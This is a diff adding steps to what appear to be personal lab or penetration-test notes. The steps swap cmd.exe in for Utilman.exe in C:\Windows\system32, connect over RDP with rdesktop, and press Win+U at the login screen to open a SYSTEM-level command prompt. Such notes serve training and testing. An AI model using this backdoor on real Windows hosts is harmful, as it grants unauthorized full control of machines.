@@ -492,6 +492,20 @@ Get-ADGroupMember 'Web Admins'
 #### - Navigated to "C:\Windows\system32" and located Utilman.exe:
 ![](Pasted%20image%2020221012220556.png)
 
+#### - Typed "ren Utilman.exe Utilman.old" and confirmed the filename changed:
 
+![](Pasted%20image%2020221012220652.png)
+
+#### - Typed "ren cmd.exe Utilman.exe"
+
+#### - Navigated to another terminal on my kali machine and typed "rdesktop 192.168.81.165"
+
+#RDP #rdesktop
+
+#### - Once at login page of RDP session I typed "windows key + u key" and received a cmd session as NT authority/system:
+
+![](Pasted%20image%2020221012220806.png)
+
+![](Pasted%20image%2020221012220843.png)
 
 ---
